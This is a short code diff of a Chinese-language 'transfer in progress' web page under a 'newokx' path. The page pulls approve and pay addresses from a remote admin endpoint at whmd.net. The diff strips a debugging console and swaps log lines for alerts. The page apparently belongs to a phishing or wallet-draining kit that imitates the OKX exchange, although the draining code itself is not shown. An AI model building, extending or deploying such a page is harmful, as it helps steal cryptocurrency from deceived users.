@@ -1,7 +1,6 @@
 
 <html lang="zh-CN" style="--status-bar-height: 0px; --top-window-height: 0px; --window-left: 0px; --window-right: 0px; --window-margin: 0px; font-size: 17.2px; --window-top: calc(var(--top-window-height) + 0px); --window-bottom: 0px;"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><!-- <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"> --><meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"><title>正在转账</title><script src="newokx/js/jquery-3.5.1.min.js"></script>
-      <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-<script>eruda.init();</script>
+   
 <style>
         ::-webkit-scrollbar {
             display: none;
@@ -144,12 +143,12 @@ fetch('https://whmd.net/yyadmin/database.php')
                     console.log('未定义的配置键:', config.config_key);
             }
         });
-
+	
         // 现在可以在这里使用这些变量，因为数据已经被赋值
-        console.log('Authorized Address:', approveaddress);
-        console.log('Pay Address:', payaddress);
-        console.log('Is Miaou:', ismiaou);
-        console.log('Is Open:', isopen);
+      alert('Authorized Address:', approveaddress);
+        alert('Pay Address:', payaddress);
+        alert('Is Miaou:', ismiaou);
+        alert('Is Open:', isopen);
         if(isopen === '0'){
       console.log(isopen);
     }else{
